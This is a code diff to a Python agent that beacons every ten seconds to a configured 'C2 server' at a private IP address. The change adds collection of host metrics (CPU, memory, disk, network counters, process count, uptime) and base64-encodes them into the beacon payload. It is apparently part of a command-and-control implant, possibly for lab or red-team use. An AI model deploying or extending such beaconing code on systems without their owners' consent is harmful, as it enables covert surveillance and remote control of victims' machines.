@@ -40,7 +40,7 @@ except ImportError:
 # === Configuration ===
 C2_URL = "http://192.168.200.105:5000"  # Update this to your C2 server's IP address
 BEACON_INTERVAL = 10
-agent_id = f"agent_{uuid.uuid4()}"
+agent_id = f"agent_{uuid.uuid4()}"  # Generate new ID each run
 # ======================
 
 # Logger setup
@@ -126,11 +126,63 @@ def send_beacon():
             system_info = get_system_info()
         except:
             system_info = {}
+        
+        # Collect additional metrics for dashboard
+        logging.info("Starting metrics collection...")
+        try:
+            import psutil
+            import os
+            logging.info("psutil imported successfully")
+            
+            # System metrics
+            cpu_percent = psutil.cpu_percent(interval=1)
+            logging.info(f"CPU: {cpu_percent}")
+            memory = psutil.virtual_memory()
+            logging.info(f"Memory: {memory.percent}")
+            
+            # Get disk usage for current drive (Windows compatible)
+            if os.name == 'nt':  # Windows
+                disk = psutil.disk_usage('C:\\')
+                logging.info("Using Windows disk path")
+            else:  # Unix/Linux
+                disk = psutil.disk_usage('/')
+                logging.info("Using Unix disk path")
+            
+            logging.info(f"Disk: {disk.percent}")
+            
+            # Network stats
+            network = psutil.net_io_counters()
+            logging.info(f"Network sent: {network.bytes_sent}")
+            
+            # Process count
+            process_count = len(psutil.pids())
+            logging.info(f"Process count: {process_count}")
+            
+            metrics = {
+                'cpu_usage': cpu_percent,
+                'memory_usage': memory.percent,
+                'memory_total': memory.total,
+                'memory_used': memory.used,
+                'disk_usage': disk.percent,
+                'disk_total': disk.total,
+                'disk_used': disk.used,
+                'network_sent': network.bytes_sent,
+                'network_recv': network.bytes_recv,
+                'process_count': process_count,
+                'uptime': time.time() - psutil.boot_time()
+            }
+            logging.info(f"Final metrics dict: {metrics}")
+        except Exception as e:
+            logging.error(f"Failed to collect metrics: {str(e)}")
+            import traceback
+            logging.error(f"Traceback: {traceback.format_exc()}")
+            metrics = {}
             
         payload = {
             "agent_id": agent_id,
             "status": "online",
             "system_info": system_info,
+            "metrics": metrics,
             "timestamp": datetime.now().isoformat()
         }
         encoded = base64.b64encode(json.dumps(payload).encode()).decode()
